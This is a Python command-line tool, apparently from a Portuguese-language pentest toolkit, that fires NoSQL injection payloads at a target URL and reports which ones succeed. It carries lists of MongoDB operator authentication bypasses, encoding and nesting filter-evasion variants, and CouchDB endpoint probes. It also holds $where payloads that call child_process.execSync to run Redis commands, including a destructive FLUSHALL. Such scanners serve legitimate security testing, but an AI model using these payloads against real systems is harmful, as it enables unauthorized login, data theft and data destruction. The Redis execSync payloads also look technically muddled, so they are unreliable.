#!/usr/bin/env python3
"""Modulo de deteccao de NoSQL Injection.

Testa se o servidor e vulneravel a injecao NoSQL via:
  - MongoDB — operadores $gt, $ne, $regex, $where, $exists, $nin, $or, $and
  - Redis — comandos INFO, CONFIG, FLUSHALL, KEYS, EVAL
  - CouchDB — endpoints _all_docs, _changes, _show, _utils
  - Bypass — encoding, nested JSON, mixed types

Fluxo:
  1. Envia payloads de deteccao em JSON body (POST) e query params
  2. Verifica se a resposta indica bypass de autenticacao ou erro de parser
  3. Se detectado, envia payloads de exploit (data exfil, auth bypass, RCE)
  4. Classifica: detectado, blocked, error
  5. Retorna resultado consolidado com severidade
"""
import argparse
import asyncio
import logging
from collections.abc import Awaitable
from dataclasses import asdict, dataclass

import httpx

from mytools.core.utils import (
    Cyber,
    add_common_args,
    color,
    create_async_client,
    create_banner,
    run_main_loop,
    safe_asyncio_run,
    write_output,
)

logger = logging.getLogger("mytools.nosqliinject")

_CATEGORY_MAP: dict[str, list[str]] = {
    "detect": ["gt_bypass", "ne_bypass", "regex_bypass", "exists_bypass", "type_bypass"],
    "mongodb": ["mongo_gt", "mongo_ne", "mongo_where", "mongo_regex", "mongo_or", "mongo_nin", "mongo_and", "mongo_not", "mongo_mod", "mongo_exists", "mongo_type"],
    "redis": ["redis_info", "redis_config", "redis_keys", "redis_eval", "redis_flushall"],
    "couchdb": ["couchdb_alldocs", "couchdb_changes", "couchdb_show", "couchdb_utils", "couchdb_config"],
    "bypass": ["unicode_bypass", "double_json", "nested_bypass", "mixed_type", "array_bypass", "null_terminator"],
}

_DETECT_PAYLOADS: list[tuple[str, str, str, list[str]]] = [
    (
        "gt_bypass",
        '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
        "application/json",
        ["welcome", "success", "token", "authenticated", "logged"],
    ),
    (
        "ne_bypass",
        '{"username": {"$ne": null}, "password": {"$ne": null}}',
        "application/json",
        ["welcome", "success", "token", "authenticated", "logged"],
    ),
    (
        "regex_bypass",
        '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}',
        "application/json",
        ["welcome", "success", "token", "authenticated", "logged"],
    ),
    (
        "exists_bypass",
        '{"username": {"$exists": true}, "password": {"$exists": true}}',
        "application/json",
        ["welcome", "success", "token", "authenticated", "logged"],
    ),
    (
        "type_bypass",
        '{"username": {"$type": "string"}, "password": {"$type": "string"}}',
        "application/json",
        ["welcome", "success", "token", "authenticated", "logged"],
    ),
]

_MONGODB_PAYLOADS: list[tuple[str, str, str, list[str]]] = [
    (
        "mongo_gt",
        '{"user": {"$gt": ""}, "pass": {"$gt": ""}}',
        "application/json",
        ["welcome", "success", "token", "dashboard"],
    ),
    (
        "mongo_ne",
        '{"user": {"$ne": ""}, "pass": {"$ne": ""}}',
        "application/json",
        ["welcome", "success", "token", "dashboard"],
    ),
    (
        "mongo_where",
        '{"$where": "function(){return true}"}',
        "application/json",
        ["welcome", "success", "token", "result"],
    ),
    (
        "mongo_regex",
        '{"user": {"$regex": "^admin"}, "pass": {"$regex": ".*"}}',
        "application/json",
        ["welcome", "success", "token", "admin"],
    ),
    (
        "mongo_or",
        '{"$or": [{"user": "admin"}, {"admin": true}]}',
        "application/json",
        ["welcome", "success", "token", "admin"],
    ),
    (
        "mongo_nin",
        '{"user": {"$nin": []}, "pass": {"$nin": []}}',
        "application/json",
        ["welcome", "success", "token"],
    ),
    (
        "mongo_and",
        '{"$and": [{"user": {"$ne": ""}}, {"pass": {"$ne": ""}}]}',
        "application/json",
        ["welcome", "success", "token"],
    ),
    (
        "mongo_not",
        '{"user": {"$not": {"$eq": "nobody"}}}',
        "application/json",
        ["welcome", "success", "token"],
    ),
    (
        "mongo_mod",
        '{"user": {"$mod": [1, 0]}}',
        "application/json",
        ["welcome", "success", "token"],
    ),
    (
        "mongo_exists",
        '{"user": {"$exists": true}, "pass": {"$exists": false}}',
        "application/json",
        ["welcome", "success", "token"],
    ),
    (
        "mongo_type",
        '{"user": {"$type": 2}, "pass": {"$type": 2}}',
        "application/json",
        ["welcome", "success", "token"],
    ),
]

_REDIS_PAYLOADS: list[tuple[str, str, str, list[str]]] = [
    (
        "redis_info",
        '{"$where": "var x=require(\"child_process\").execSync(\"INFO\").toString()"}',
        "application/json",
        ["redis_version", "connected_clients", "used_memory"],
    ),
    (
        "redis_config",
        '{"$where": "var x=require(\"child_process\").execSync(\"CONFIG GET *\").toString()"}',
        "application/json",
        ["bind", "port", "requirepass"],
    ),
    (
        "redis_keys",
        '{"$where": "var x=require(\"child_process\").execSync(\"KEYS *\").toString()"}',
        "application/json",
        ["session", "user", "token"],
    ),
    (
        "redis_eval",
        '{"$where": "var x=require(\"child_process\").execSync(\"EVAL \\\"return redis.call(\\\"INFO\\\")\\\"\").toString()"}',
        "application/json",
        ["redis_version"],
    ),
    (
        "redis_flushall",
        '{"$where": "var x=require(\"child_process\").execSync(\"FLUSHALL\").toString()"}',
        "application/json",
        ["ok", "flushall"],
    ),
]

_COUCHDB_PAYLOADS: list[tuple[str, str, str, list[str]]] = [
    (
        "couchdb_alldocs",
        '{"_all_docs": true, "include_docs": true}',
        "application/json",
        ["total_rows", "offset", "rows"],
    ),
    (
        "couchdb_changes",
        '{"_changes": {"since": 0, "limit": 10}}',
        "application/json",
        ["results", "last_seq"],
    ),
    (
        "couchdb_show",
        '{"_show": "login", "user": "admin"}',
        "application/json",
        ["name", "roles", "ok"],
    ),
    (
        "couchdb_utils",
        '{"_utils": true}',
        "application/json",
        ["Futon", "couchdb", "version"],
    ),
    (
        "couchdb_config",
        '{"_config": {"section": "admin"}}',
        "application/json",
        ["bind_address", "port", "require_valid_user"],
    ),
]

_BYPASS_PAYLOADS: list[tuple[str, str, str, list[str]]] = [
    (
        "unicode_bypass",
        '{"u\\u0073ername": {"\\u0024gt": ""}}',
        "application/json",
        ["welcome", "success", "token"],
    ),
    (
        "double_json",
        '{"data": "{\\"user\\": {\\"$gt\\": \\"\\", \\"pass\\": {\\"$gt\\": \\"\\"}}}"}',
        "application/json",
        ["welcome", "success", "token"],
    ),
    (
        "nested_bypass",
        '{"query": {"user": {"$gt": ""}, "pass": {"$gt": ""}}, "options": {}}',
        "application/json",
        ["welcome", "success", "token"],
    ),
    (
        "mixed_type",
        '{"user": 0, "pass": {"$gt": ""}}',
        "application/json",
        ["welcome", "success", "token"],
    ),
    (
        "array_bypass",
        '{"user": [{"$gt": ""}], "pass": [{"$gt": ""}]}',
        "application/json",
        ["welcome", "success", "token"],
    ),
    (
        "null_terminator",
        '{"user": "admin\\u0000", "pass": {"$ne": ""}}',
        "application/json",
        ["welcome", "success", "token"],
    ),
]

_LOGIN_PARAMS: list[str] = [
    "user", "username", "email", "login", "name", "account",
    "pass", "password", "pwd", "secret", "auth",
]


@dataclass(frozen=True, slots=True)
class NoSQLiAttempt:
    """Tentativa individual de NoSQL Injection."""

    technique: str
    category: str
    payload: str
    method: str
    status_baseline: int
    status_test: int
    size_baseline: int
    size_test: int
    status_changed: bool
    size_changed: bool
    vulnerable: bool
    details: str
    error: str


@dataclass(frozen=True, slots=True)
class NoSQLiResult:
    """Resultado consolidado do scan de NoSQL Injection."""

    target: str
    baseline_status: int
    baseline_size: int
    tls: bool
    attempts: list[NoSQLiAttempt]
    vulnerable_techniques: list[str]
    blocked_techniques: list[str]
    issues: list[str]
    overall_status: str


async def _test_baseline(client: httpx.AsyncClient, url: str) -> tuple[int, int, bytes]:
    """Envia requisicao baseline para obter resposta de referencia."""
    try:
        resp = await client.get(url, follow_redirects=False)
        return resp.status_code, len(resp.content), resp.content
    except httpx.RequestError:
        return 0, 0, b""


def _check_nosqli_response(
    body: bytes,
    status: int,
    indicators: list[str],
) -> bool:
    """Verifica se a resposta indica NoSQL injection bem-sucedido."""
    text = body.decode("utf-8", errors="ignore").lower()
    if status == 0:
        return False
    return any(indicator.lower() in text for indicator in indicators)


async def _test_detect(
    client: httpx.AsyncClient,
    base_url: str,
    baseline: tuple[int, int, bytes],
) -> list[NoSQLiAttempt]:
    """Testa NoSQL injection basico com payloads de deteccao."""
    attempts: list[NoSQLiAttempt] = []
    b_status, b_size, _ = baseline

    for technique, payload, ct, indicators in _DETECT_PAYLOADS:
        for method in ("json_post", "query"):
            try:
                if method == "json_post":
                    resp = await client.post(
                        base_url,
                        content=payload.encode(),
                        headers={"Content-Type": ct},
                        follow_redirects=False,
                    )
                else:
                    resp = await client.get(
                        base_url,
                        params={"data": payload},
                        follow_redirects=False,
                    )

                t_status = resp.status_code
                t_size = len(resp.content)
                status_changed = t_status != b_status
                vulnerable = _check_nosqli_response(resp.content, t_status, indicators)

                attempts.append(NoSQLiAttempt(
                    technique=f"{technique}_{method}",
                    category="detect",
                    payload=payload[:120],
                    method=method,
                    status_baseline=b_status,
                    status_test=t_status,
                    size_baseline=b_size,
                    size_test=t_size,
                    status_changed=status_changed,
                    size_changed=abs(t_size - b_size) > 50,
                    vulnerable=vulnerable,
                    details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
                    error="",
                ))
            except httpx.RequestError as exc:
                attempts.append(NoSQLiAttempt(
                    technique=f"{technique}_{method}",
                    category="detect",
                    payload=payload[:120],
                    method=method,
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    status_changed=False,
                    size_changed=False,
                    vulnerable=False,
                    details="",
                    error=str(exc),
                ))

    return attempts


async def _test_mongodb(
    client: httpx.AsyncClient,
    base_url: str,
    baseline: tuple[int, int, bytes],
) -> list[NoSQLiAttempt]:
    """Testa MongoDB NoSQL injection."""
    attempts: list[NoSQLiAttempt] = []
    b_status, b_size, _ = baseline

    for technique, payload, ct, indicators in _MONGODB_PAYLOADS:
        try:
            resp = await client.post(
                base_url,
                content=payload.encode(),
                headers={"Content-Type": ct},
                follow_redirects=False,
            )
            t_status = resp.status_code
            t_size = len(resp.content)
            status_changed = t_status != b_status
            vulnerable = _check_nosqli_response(resp.content, t_status, indicators)

            attempts.append(NoSQLiAttempt(
                technique=technique,
                category="mongodb",
                payload=payload[:120],
                method="json_post",
                status_baseline=b_status,
                status_test=t_status,
                size_baseline=b_size,
                size_test=t_size,
                status_changed=status_changed,
                size_changed=abs(t_size - b_size) > 50,
                vulnerable=vulnerable,
                details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
                error="",
            ))
        except httpx.RequestError as exc:
            attempts.append(NoSQLiAttempt(
                technique=technique,
                category="mongodb",
                payload=payload[:120],
                method="json_post",
                status_baseline=b_status,
                status_test=0,
                size_baseline=b_size,
                size_test=0,
                status_changed=False,
                size_changed=False,
                vulnerable=False,
                details="",
                error=str(exc),
            ))

    return attempts


async def _test_redis(
    client: httpx.AsyncClient,
    base_url: str,
    baseline: tuple[int, int, bytes],
) -> list[NoSQLiAttempt]:
    """Testa Redis injection via NoSQL vectors."""
    attempts: list[NoSQLiAttempt] = []
    b_status, b_size, _ = baseline

    for technique, payload, ct, indicators in _REDIS_PAYLOADS:
        try:
            resp = await client.post(
                base_url,
                content=payload.encode(),
                headers={"Content-Type": ct},
                follow_redirects=False,
            )
            t_status = resp.status_code
            t_size = len(resp.content)
            status_changed = t_status != b_status
            vulnerable = _check_nosqli_response(resp.content, t_status, indicators)

            attempts.append(NoSQLiAttempt(
                technique=technique,
                category="redis",
                payload=payload[:120],
                method="json_post",
                status_baseline=b_status,
                status_test=t_status,
                size_baseline=b_size,
                size_test=t_size,
                status_changed=status_changed,
                size_changed=abs(t_size - b_size) > 50,
                vulnerable=vulnerable,
                details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
                error="",
            ))
        except httpx.RequestError as exc:
            attempts.append(NoSQLiAttempt(
                technique=technique,
                category="redis",
                payload=payload[:120],
                method="json_post",
                status_baseline=b_status,
                status_test=0,
                size_baseline=b_size,
                size_test=0,
                status_changed=False,
                size_changed=False,
                vulnerable=False,
                details="",
                error=str(exc),
            ))

    return attempts


async def _test_couchdb(
    client: httpx.AsyncClient,
    base_url: str,
    baseline: tuple[int, int, bytes],
) -> list[NoSQLiAttempt]:
    """Testa CouchDB NoSQL injection."""
    attempts: list[NoSQLiAttempt] = []
    b_status, b_size, _ = baseline

    for technique, payload, ct, indicators in _COUCHDB_PAYLOADS:
        try:
            resp = await client.post(
                base_url,
                content=payload.encode(),
                headers={"Content-Type": ct},
                follow_redirects=False,
            )
            t_status = resp.status_code
            t_size = len(resp.content)
            status_changed = t_status != b_status
            vulnerable = _check_nosqli_response(resp.content, t_status, indicators)

            attempts.append(NoSQLiAttempt(
                technique=technique,
                category="couchdb",
                payload=payload[:120],
                method="json_post",
                status_baseline=b_status,
                status_test=t_status,
                size_baseline=b_size,
                size_test=t_size,
                status_changed=status_changed,
                size_changed=abs(t_size - b_size) > 50,
                vulnerable=vulnerable,
                details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
                error="",
            ))
        except httpx.RequestError as exc:
            attempts.append(NoSQLiAttempt(
                technique=technique,
                category="couchdb",
                payload=payload[:120],
                method="json_post",
                status_baseline=b_status,
                status_test=0,
                size_baseline=b_size,
                size_test=0,
                status_changed=False,
                size_changed=False,
                vulnerable=False,
                details="",
                error=str(exc),
            ))

    return attempts


async def _test_bypass(
    client: httpx.AsyncClient,
    base_url: str,
    baseline: tuple[int, int, bytes],
) -> list[NoSQLiAttempt]:
    """Testa bypass de filtragem NoSQL."""
    attempts: list[NoSQLiAttempt] = []
    b_status, b_size, _ = baseline

    for technique, payload, ct, indicators in _BYPASS_PAYLOADS:
        try:
            resp = await client.post(
                base_url,
                content=payload.encode(),
                headers={"Content-Type": ct},
                follow_redirects=False,
            )
            t_status = resp.status_code
            t_size = len(resp.content)
            status_changed = t_status != b_status
            vulnerable = _check_nosqli_response(resp.content, t_status, indicators)

            attempts.append(NoSQLiAttempt(
                technique=technique,
                category="bypass",
                payload=payload[:120],
                method="json_post",
                status_baseline=b_status,
                status_test=t_status,
                size_baseline=b_size,
                size_test=t_size,
                status_changed=status_changed,
                size_changed=abs(t_size - b_size) > 50,
                vulnerable=vulnerable,
                details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
                error="",
            ))
        except httpx.RequestError as exc:
            attempts.append(NoSQLiAttempt(
                technique=technique,
                category="bypass",
                payload=payload[:120],
                method="json_post",
                status_baseline=b_status,
                status_test=0,
                size_baseline=b_size,
                size_test=0,
                status_changed=False,
                size_changed=False,
                vulnerable=False,
                details="",
                error=str(exc),
            ))

    return attempts


def print_results(result: NoSQLiResult) -> None:
    """Exibe os resultados do scan de NoSQL Injection."""
    print(color("\n" + "=" * 60, Cyber.GRAY))
    print(color("  NOSQL INJECTION — RESULTADOS", Cyber.CYAN, Cyber.BOLD))
    print(color("=" * 60, Cyber.GRAY))

    print(color(f"  Target:     {result.target}", Cyber.WHITE))
    print(color(f"  Baseline:   {result.baseline_status} ({result.baseline_size} bytes)", Cyber.GRAY))
    print(color(f"  Total:      {len(result.attempts)} testes realizados", Cyber.GRAY))

    vuln_techs = result.vulnerable_techniques
    if vuln_techs:
        print(color(f"\n  [!] {len(vuln_techs)} TECNICAS VULNERAVEIS", Cyber.RED, Cyber.BOLD))
        for tech in vuln_techs[:10]:
            print(color(f"      [!] {tech}", Cyber.RED))
        print(color("\n  Severidade: ALTA", Cyber.RED, Cyber.BOLD))
    else:
        print(color("\n  [+] Nenhuma NoSQL Injection detectada", Cyber.GREEN, Cyber.BOLD))
        print(color("  Severidade: NENHUMA", Cyber.GREEN, Cyber.BOLD))

    issues = result.issues
    if issues:
        print(color(f"\n  Problemas ({len(issues)}):", Cyber.YELLOW, Cyber.BOLD))
        for issue in issues[:10]:
            print(color(f"      {issue}", Cyber.YELLOW))

    errors = [a for a in result.attempts if a.error]
    if errors:
        print(color(f"\n  Erros ({len(errors)}):", Cyber.GRAY))
        for e in errors[:3]:
            print(color(f"      {e.error[:80]}", Cyber.GRAY))

    print(color("=" * 60, Cyber.GRAY))


async def run_scan(
    target: str,
    categories: list[str],
    timeout: int,
    concurrency: int,
    output_file: str | None,
    verbose: bool,
) -> int:
    """Executa o scan NoSQL Injection."""
    tls = target.startswith("https")
    client = create_async_client(timeout=timeout)

    print(color(f"\n  Conectando a {target}...", Cyber.CYAN))
    baseline = await _test_baseline(client, target)
    if baseline[0] == 0:
        print(color("  [!] Falha ao conectar no alvo", Cyber.RED))
        return 1

    print(color(f"  Baseline: {baseline[0]} ({baseline[1]} bytes)", Cyber.GRAY))

    run_categories = categories or list(_CATEGORY_MAP.keys())
    all_attempts: list[NoSQLiAttempt] = []

    tasks: list[Awaitable[list[NoSQLiAttempt]]] = []
    for cat in run_categories:
        if cat == "detect":
            tasks.append(_test_detect(client, target, baseline))
        elif cat == "mongodb":
            tasks.append(_test_mongodb(client, target, baseline))
        elif cat == "redis":
            tasks.append(_test_redis(client, target, baseline))
        elif cat == "couchdb":
            tasks.append(_test_couchdb(client, target, baseline))
        elif cat == "bypass":
            tasks.append(_test_bypass(client, target, baseline))

    if tasks:
        results_list = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results_list:
            if isinstance(r, list):
                all_attempts.extend(r)

    vuln_techs = [a.technique for a in all_attempts if a.vulnerable]
    blocked = [a.technique for a in all_attempts if not a.vulnerable and not a.error]
    issues: list[str] = []
    for att in all_attempts:
        if att.vulnerable:
            issues.append(f"VULN: {att.technique} - {att.details}")

    overall = "vulnerable" if vuln_techs else "secure"

    result = NoSQLiResult(
        target=target,
        baseline_status=baseline[0],
        baseline_size=baseline[1],
        tls=tls,
        attempts=all_attempts,
        vulnerable_techniques=vuln_techs,
        blocked_techniques=blocked,
        issues=issues,
        overall_status=overall,
    )

    print_results(result)

    if output_file:
        write_output(output_file, asdict(result))

    logger.info("NoSQLi scan concluido: %d testes, %d vulneraveis", len(all_attempts), len(vuln_techs))
    return 1 if vuln_techs else 0


banner_art = create_banner(
    r"""
     __________ _____  ______   ______             ______           _     _  _
    |___  /_  _|  _  ||___  /  | ___ \           | ___ \         | |   | || |
       / /  | | | |_| |  / /   | |_/ / __ _  __ _| |_/ / __ _  __| | __| || |_
      / /   | | |  _  |  / /    | ___ \/ _` |/ _` |    / / _` |/ _` |/ _` | __|
     / /____| | | | | | / /     | |_/ / (_| | (_| | |\ \ (_| | (_| | (_| | |_
     \____/\___/\_| |_/ \_/     \____/ \__,_|\__, \_| \_\__,_|\__,_|\__,_|\__|
                                              __/ |
                                             |___/
    """,
    "NoSQL Injection — detecta injecao NoSQL em web apps (MongoDB, Redis, CouchDB)",
)


def build_parser() -> argparse.ArgumentParser:
    """Constrói o parser de argumentos CLI."""
    parser = argparse.ArgumentParser(
        prog="mytools-nosqli",
        description="NoSQL Injection — detecta injecao NoSQL em web apps (MongoDB, Redis, CouchDB)",
    )
    parser.add_argument("url", help="URL alvo (ex: https://example.com)")
    parser.add_argument(
        "-c", "--category",
        choices=list(_CATEGORY_MAP.keys()),
        help="Categoria de testes (default: todas)",
    )
    parser.add_argument("--concurrency", type=int, default=5, help="Requisicoes simultaneas (default: 5)")
    add_common_args(parser)
    return parser


def run_once(args: argparse.Namespace) -> int:
    """Executa um scan NoSQL Injection a partir de argumentos parseados."""
    logger.info("NoSQLi scan iniciado para %s", args.url)
    categories: list[str] = []
    if getattr(args, "category", None):
        categories = [args.category]
    return safe_asyncio_run(
        run_scan(
            target=args.url,
            categories=categories,
            timeout=getattr(args, "timeout", 10),
            concurrency=getattr(args, "concurrency", 5),
            output_file=getattr(args, "output", None),
            verbose=getattr(args, "verbose", False),
        ),
    )


def main() -> int:
    """Ponto de entrada principal."""
    return run_main_loop(
        parser=build_parser(),
        banner_fn=banner_art,
        run_fn=run_once,
        has_target=lambda a: bool(getattr(a, "url", None) or getattr(a, "target", None)),
        prompt="nosql> ",
        description="NoSQL Injection interativo.",
        example="https://target.com -c detect",
        contextual_help=(
            "Uso: <url> [opcoes]\n"
            "Exemplos:\n"
            "  https://target.com\n"
            "  https://target.com -c detect\n"
            "  https://target.com -c mongodb\n"
            "  https://target.com -c bypass --proxy http://127.0.0.1:8080"
        ),
    )


if __name__ == "__main__":
    raise SystemExit(main())
